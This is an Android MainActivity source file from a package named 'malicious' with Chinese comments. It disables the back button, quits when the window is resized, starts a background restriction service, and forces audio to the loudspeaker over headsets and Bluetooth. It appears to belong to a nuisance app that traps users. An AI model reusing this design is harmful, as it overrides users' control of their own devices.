package com.example.malicious;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.media.AudioManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Switch;
import android.widget.Toast;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import java.util.concurrent.Executors;

import com.example.loudspeaker.AudioUtils;
import com.example.loudspeaker.HeadsetReceiver;
import com.example.loudspeaker.BluetoothReceiver;
import com.example.utils.PermissionChecks;
import com.example.utils.RestrictionManager;
import com.example.service.RestrictionService;


public class MainActivity extends AppCompatActivity  {
    private final RestrictionManager restrictionManager = new RestrictionManager(this, Executors.newScheduledThreadPool(1));
    private final HeadsetReceiver headsetReceiver = new HeadsetReceiver();
    private final BluetoothReceiver bluetoothReceiver = new BluetoothReceiver();
    public static boolean appStatus = false;
    private static int width;
    private static int height;


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState); // 调用父类方法
        setContentView(R.layout.activity_main); // 设置布局文件

        PermissionChecks.checkNotificationPermission(this); // 检查通知权限
        if (!appStatus) startService(new Intent(this, RestrictionService.class)); // 启动服务
        setVolumeControlStream(AudioManager.STREAM_MUSIC); // 设置音量控制流为媒体流
        onGlobalLayout();
    };


    // 监听布局大小
    private void onGlobalLayout() {
        final View rootView = findViewById(android.R.id.content);
        rootView.getViewTreeObserver().addOnGlobalLayoutListener(() -> {
            if (width == 0 || height == 0) {
                width = rootView.getWidth();
                height = rootView.getHeight();
                return;
            };
            if (width != rootView.getWidth() || height != rootView.getHeight()) {
                Toast.makeText(this, "不支持悬浮窗功能", Toast.LENGTH_SHORT).show();
                finish();
            };
        });
    };


    // 禁止返回键
    @SuppressLint("MissingSuperCall")
    @Override
    public void onBackPressed() {};


    // 处理 Switch 点击事件的方法
    public void onSwitchClicked(final View view) {
        // 检查悬浮窗权限
        if (PermissionChecks.hasOverlayPermission(this)) {
            startActivity(PermissionChecks.getOverlayPermissionIntent(this));
            handleButton();
            Toast.makeText(this, "该功能需要悬浮窗权限", Toast.LENGTH_SHORT).show();
        } else {
            if (view.getId() == R.id.switch4) {
                Toast.makeText(this, "该功能暂未开放, 请选择其他功能", Toast.LENGTH_SHORT).show();
                return;
            };
            appStatus = true;
            headsetReceiver.register(this); // 注册耳机接收器
            bluetoothReceiver.register(this); // 注册蓝牙接收器
            AudioUtils.setAudioOutputToSpeaker(this); // 设置音频输出到扬声器
            restrictionManager.startRestriction(); // 启用限制
        };
    };


    // 按钮处理
    private void handleButton() {
        final int[] switchIds = {R.id.switch1, R.id.switch2, R.id.switch3, R.id.switch4};
        for (final int id : switchIds) {
            @SuppressLint("UseSwitchCompatOrMaterialCode") final Switch switchView = findViewById(id);
            switchView.setChecked(false);
        };
    };
};